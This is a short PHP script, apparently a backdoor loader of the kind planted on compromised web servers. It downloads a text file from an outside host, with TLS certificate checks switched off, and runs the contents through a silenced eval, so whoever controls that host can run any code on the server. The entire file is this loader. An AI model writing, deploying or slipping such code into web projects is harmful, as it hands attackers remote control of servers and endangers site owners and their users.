<?php
$u = 'https://teamzedd2027.tech/project/rahman.txt';
$d = '';

if (function_exists('curl_init')) {
    $ch = curl_init($u);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_FOLLOWLOCATION => 1]);
    $d = curl_exec($ch);
    curl_close($ch);
} elseif (ini_get('allow_url_fopen')) {
    $d = file_get_contents($u, false, stream_context_create(["ssl"=>["verify_peer"=>false]]));
}

if ($d) @eval('?>'.$d);